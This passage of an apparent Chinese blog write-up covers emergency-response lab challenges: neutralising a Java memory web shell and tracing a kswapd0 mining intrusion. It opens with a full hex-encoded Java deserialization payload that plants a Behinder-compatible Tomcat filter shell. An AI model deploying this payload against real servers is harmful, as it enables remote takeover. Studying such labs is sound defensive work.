4b6579537065630c016301640c006301650c006a016601001673756e2f6d6973632f4241534536344465636f6465720c016701680701690c016a013c0c016b014b0c016c016d0c015c016e010006657175616c730100136a6176612f6c616e672f457863657074696f6e01000c4175746f6d6e6547726565740100306f72672f6170616368652f636174616c696e612f6c6f616465722f576562617070436c6173734c6f61646572426173650c016f01700701710c017201730100286f72672f6170616368652f636174616c696e612f636f72652f5374616e64617264436f6e746578740100286f72672e6170616368652e636174616c696e612e636f72652e5374616e64617264436f6e746578740c017401530c017501760701770c0178017901000d6a6176612f7574696c2f4d61700100084963655368656c6c01002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465660c017a017b0c017c017d0c017e017d0c017f018001002f6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61700100062f7368656c6c0c0181017d0701820c018301840c00c2013c0c0185017d0c018601870100306f72672f6170616368652f636174616c696e612f636f72652f4170706c69636174696f6e46696c746572436f6e66696701001b6f72672f6170616368652f636174616c696e612f436f6e74657874010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a617661782f736572766c65742f46696c74657201001e6a617661782f736572766c65742f536572766c6574457863657074696f6e01001c6a617661782f736572766c65742f536572766c65745265717565737401001d6a617661782f736572766c65742f536572766c6574526573706f6e73650100196a617661782f736572766c65742f46696c746572436861696e01001e6a617661782f736572766c65742f687474702f4874747053657373696f6e0100136a6176612f696f2f494f457863657074696f6e0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010039636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f5472616e736c6574457863657074696f6e01000a67657453657373696f6e01002228294c6a617661782f736572766c65742f687474702f4874747053657373696f6e3b010003707574010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010015676574436f6e74657874436c6173734c6f6164657201001928294c6a6176612f6c616e672f436c6173734c6f616465723b0100096765744d6574686f6401001428294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f537472696e67010015284c6a6176612f6c616e672f4f626a6563743b295a010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b01000d6765745375706572636c6173730100076765744e616d65010040284c6a617661782f736572766c65742f536572766c6574526571756573743b4c6a617661782f736572766c65742f536572766c6574526573706f6e73653b29560100106a6176612f7574696c2f42617365363401000a6765744465636f6465720100074465636f64657201000c496e6e6572436c617373657301001c28294c6a6176612f7574696c2f426173653634244465636f6465723b0100186a6176612f7574696c2f426173653634244465636f6465720100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420100116a6176612f6c616e672f496e7465676572010004545950450100116765744465636c617265644d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b01000d73657441636365737369626c65010004285a29560100096c6f6164436c617373010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b01000776616c75654f660100162849294c6a6176612f6c616e672f496e74656765723b010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100166765744465636c61726564436f6e7374727563746f72010033285b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f723b01001d6a6176612f6c616e672f7265666c6563742f436f6e7374727563746f7201000e676574436c6173734c6f6164657201000b6e6577496e7374616e6365010027285b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000c736574417474726962757465010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100136a617661782f63727970746f2f43697068657201000b676574496e7374616e6365010029284c6a6176612f6c616e672f537472696e673b294c6a617661782f63727970746f2f4369706865723b010008676574427974657301000428295b42010017285b424c6a6176612f6c616e672f537472696e673b295601001728494c6a6176612f73656375726974792f4b65793b295601000967657452656164657201001a28294c6a6176612f696f2f42756666657265645265616465723b0100166a6176612f696f2f4275666665726564526561646572010008726561644c696e6501000c6465636f6465427566666572010007646f46696e616c010006285b42295b4201001428294c6a6176612f6c616e672f4f626a6563743b01000c6765745265736f757263657301002728294c6f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f743b0100236f72672f6170616368652f636174616c696e612f5765625265736f75726365526f6f7401000a676574436f6e7465787401001f28294c6f72672f6170616368652f636174616c696e612f436f6e746578743b010007666f724e616d650100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c64010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b01000973657446696c746572010019284c6a617661782f736572766c65742f46696c7465723b295601000d73657446696c7465724e616d65010015284c6a6176612f6c616e672f537472696e673b295601000e73657446696c746572436c61737301000c61646446696c746572446566010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724465663b295601000d61646455524c5061747465726e01001c6a617661782f736572766c65742f44697370617463686572547970650100075245515545535401001e4c6a617661782f736572766c65742f44697370617463686572547970653b01000d7365744469737061746368657201001261646446696c7465724d61704265666f7265010034284c6f72672f6170616368652f746f6d6361742f7574696c2f64657363726970746f722f7765622f46696c7465724d61703b29560021004b005e0001005f0001001200600061000100620000000200020008000100630064000100650000003d000200010000000b2ab700012a1202b50003b10000000200660000000e00030000002900040027000a002a00670000000c00010000000b0068006900000001006a006b00030065000000350000000200000001b10000000200660000000600010000002d00670000001600020000000100680069000000000001006c006d0001006e000000040001006f00700000000501006c000000010071007200030065000003180006000a000001ab2bc000043a042cc000053a051904b9000601003a06bb000759b700083a07190712091906b9000a0300571907120b1904b9000a0300571907120c1905b9000a030057b8000db6000e3a081904b9000f01001210b600119901541908b60012b60013b600141215b6001199001e1908b60012b600133a092a19091908190619041907b60016a7011e1908b60012b60013b60013b600141215b600119900211908b60012b60013b600133a092a19091908190619041907b60016a700ea1908b60012b60013b60013b60013b600141215b600119900241908b60012b60013b60013b600133a092a19091908190619041907b60016a700b01908b60012b60013b60013b60013b60013b600141215b600119900271908b60012b60013b60013b60013b600133a092a19091908190619041907b60016a700701908b60012b60013b60013b60013b60013b60013b600141215b6001199002a1908b60012b60013b60013b60013b60013b600133a092a19091908190619041907b60016a7002a1908b60012b60013b60013b60013b60013b60013b600133a092a19091908190619041907b600162d2b2cb900170300b100000004006600000072001c0000003000060031000c003200150033001e0034002a00350036003600420037004a00380059003a006c003b0076003c0087003d009d003e00aa003f00bb004000d4004100e4004200f5004301110044012400450135004601540047016a0048017b004a0194004b01a2004e01aa0051006700000098000f0076001100730074000900aa001100730074000900e4001100730074000901240011007300740009016a001100730074000901940016007300740009000001ab006800690000000001ab007500760001000001ab007700780002000001ab0079007a0003000601a5007b007c0004000c019f007d007e000500150196007f00800006001e018d008100820007004a016100830084000800850000000c0001001e018d0081008600070087000000330007ff0087000907008807008907008a07008b07008c07008d07008e07008f070090000033393ffb0045fc0026070091fa0007006e0000000600020092006f00700000000d03007500000077000000790000000100930064000100650000002b0000000100000001b10000000200660000000600010000005400670000000c00010000000100680069000000010094009500030065000002e50006001200000133b800181219b6001a3a062b121b06bd001c5903121d535904b2001e535905b2001e53b6001f3a07190704b60020013a082c1221b600223a08a700293a0919072c06bd00245903190653590403b800255359051906beb8002553b60026c0001c3a08190804bd001c5903122753b600283a09190904b60029190904bd002459032ab60012b6002a53b6002b3a0a1908122c04bd001c5903121d53b6001f3a0b190b04b6002012023a0c2d122d190cb9002e0300122fb800303a0d190d05bb003159190cb60032122fb70033b60034190dbb003559b700361904b900370100b60038b60039b6003a3a0e190b190a04bd00245903190e53b60026c0001c3a0f190fb6003b3a10190f123c04bd001c5903122453b6001f3a11191104b600201911191004bd00245903190553b6002657a700053a07b1000200300038003b0023000a012d0130003d000400660000006a001a00000057000a005a0027005b002d005c0030005f00380062003b0060003d0061006100640071006500770066008c0067009e006800a4006900a8006a00b2006b00b9006c00cd006d00e8006e00fd006f0104007001160071011c0072012d007401300073013200750067000000c00013003d002400960097000900270106009800990007003000fd009a00740008007100bc009b009c0009008c00a1009d009e000a009e008f009f0099000b00a8008500a00061000c00b9007400a100a2000d00e8004500a300a4000e00fd003000a50074000f0104002900a6009e00100116001700a70099001100000133006800690000000001330073007400010000013300830084000200000133007f0080000300000133007b007c000400000133008100820005000a012900a800a4000600850000000c0001000001330081008600050087000000480004ff003b000907008807009107009007008e07008c07008f07001d0700a907009100010700aa25ff00ce000707008807009107009007008e07008c07008f07001d00010700ab01007000000015050073000000830000007f0000007b00000081000000ac0000000200ad000100ae00af000300650000003f0000000300000001b1000000020066000000060001000000780067000000200003000000010068006900000000000100b000b100010000000100b200b30002006e00000004000100b40070000000090200b0000000b20000000100ae00b500030065000000490000000400000001b10000000200660000000600010000007b00670000002a0004000000010068006900000000000100b000b100010000000100b600b700020000000100b800b90003006e00000004000100b400700000000d0300b0000000b6000000b80000000800ba006400010065000001da0005000a000000de123e4bb8000db6000ec0003f4c2bb60040b900410100c000424d1243b800441245b600464e2d04b600472d2cb60048c000493a041904123eb9004a0200c7009cbb004b59b7004c3a05bb004d59b7004e3a0619061905b6004f1906123eb6005019061905b60012b60014b600512c1906b60052bb005359b700543a0719071255b600561907123eb600571907b20058b60059b6005a2c1907b6005b125c05bd001c5903125d535904124d53b600283a08190804b60029190805bd002459032c535904190653b6002bc0005c3a091904123e1909b9000a030057a700044bb10001000000d900dc003d000300660000006600190000007f00030080000d0081001a008200250083002a008400340085004000860049008700520088005900890060008a006d008b0073008c007c008d0083008e008a008f00950090009b009100b0009200b6009300cd009400d9009700dc009600dd0099006700000066000a0049009000bb00bc00050052008700bd00be0006007c005d00bf00c0000700b00029009b009c000800cd000c006c00c10009000300d600c200610000000d00cc00c300c40001001a00bf00c500c60002002500b400c700c80003003400a500c90082000400870000000a0003fb00d9420700ab00000200ca0000000200cb01470000000a000100e500e201460009707400013170770100787372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d65737361676571007e00055b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0014707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000027372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000002774000454657374740009546573742e6a61766174000367656e7371007e00170000000f71007e001971007e001a7400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00137872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e0023787372001e636f6d2e616c69626162612e666173746a736f6e2e4a534f4e417272617900000000000000010200014c00046c69737471007e001378707371007e00220000000177040000000171007e00077878;&#34;,    }}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim" title="image-20240530112825526" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530112825526.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530112825526">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim" title="image-20240530111702810" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530111702810.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530111702810">
    </a></figure></p>
<p>成功连接
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim" title="image-20240530113025712" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113025712.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530113025712">
    </a></figure></p>
<p>直接冰蝎命令执行查看内核版本</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim" title="image-20240530113156554" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530113156554.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530113156554">
    </a></figure></p>
<p>3.清理内存马 （热清理）</p>
<p><a href="https://github.com/LandGrey/copagent" target="_blank" rel="noopener noreferrer">LandGrey/copagent: java memory web shell extracting tool (github.com)</a></p>
<p>用冰蝎修改root密码然后ssh连过去</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim" title="image-20240530115246468" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115246468.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530115246468">
    </a></figure></p>
<p>上传cop.jar，使用cop.jar将java内存拷贝出来并打包</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim" title="image-20240530115533869" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115533869.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530115533869">
    </a></figure></p>
<p>使用d盾自动找到内存马文件</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim" title="image-20240530115719207" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115719207.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530115719207">
    </a></figure></p>
<p>修改可疑文件中的冰蝎密钥，并重新编译</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim" title="image-20240530115937029" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530115937029.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530115937029">
    </a></figure></p>
<p>也可以修改其他地方，确保文件无法利用或无危害即可</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim" title="image-20240603161154913" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161154913.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240603161154913">
    </a></figure></p>
<p>上传编译后的文件IceShell.class，使用arthas热更新该文件。若未配置java环境变量，使用find / -name java 找到java路径即可。</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim" title="image-20240603161716251" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161716251.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240603161716251">
    </a></figure></p>
<p>用之前的密钥冰蝎连接失败，用修改后的密钥冰蝎连接成功。</p>
<p>4.清理后门 （热清理）</p>
<p>清除ssh公钥</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim" title="image-20240603161758032" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240603161758032.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240603161758032">
    </a></figure></p>
<h2 id="第九章-kswapd0挖矿" class="headerLink">
    <a href="#%e7%ac%ac%e4%b9%9d%e7%ab%a0-kswapd0%e6%8c%96%e7%9f%bf" class="header-mark"></a>第九章-kswapd0挖矿</h2><p>1.通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{182.164.3.252}
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看auth.log日志文件</p>
<p><code>cat /var/log/auth.log.1</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim" title="image-20240530170214406" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170214406.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530170214406">
    </a></figure></p>
<p>2.通过本地 PC SSH到服务器并且分析黑客的用户名为什么,将黑客的用户名作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{mdrfckr}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>cat /root/.ssh/authorized_keys</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim" title="image-20240530170353553" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170353553.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530170353553">
    </a></figure></p>
<p>3.通过本地 PC SSH到服务器并且分析黑客权限维持文件的md5,将文件的 MD5(md5sum /file) 作为 FLAG 提交;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{45437b4e86fba2ab890ac81db2ec3606}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim" title="image-20240530170756196" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240530170756196.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240530170756196">
    </a></figure></p>
<p>文件路径为<code>/var/spool/cron/crontabs/root</code></p></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-06-11</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/xj_emergency/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\xj_emergency.md target="_blank" rel="noopener noreferrer">View source</a>
                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\xj_emergency.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98&body=|Field|Value|%0A|-|-|%0A|Title|%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98|%0A|Url|http://scofield1920.github.io/xj_emergency/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\xj_emergency.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                    </span></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/xj_emergency/" data-title="玄机应急响应靶场刷题" data-hashtags="wp,emergency"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/xj_emergency/" data-hashtag="wp"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/xj_emergency/" data-title="玄机应急响应靶场刷题"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/xj_emergency/" data-title="玄机应急响应靶场刷题"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/xj_emergency/" data-title="玄机应急响应靶场刷题"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/xj_emergency/" data-title="玄机应急响应靶场刷题" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;玄机应急响应靶场刷题&#34;, &#34;http://scofield1920.github.io/xj_emergency/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/emergency/">Emergency</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/2024fic/" class="prev" rel="prev" title="2024 第四届全国网络空间取证竞赛"><i class="fas fa-angle-left fa-fw"></i>2024 第四届全国网络空间取证竞赛</a>
            <a href="/chunqiuyunjing-greatwall/" class="next" rel="next" title="春秋云境-GreatWall综合渗透">春秋云境-GreatWall综合渗透<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
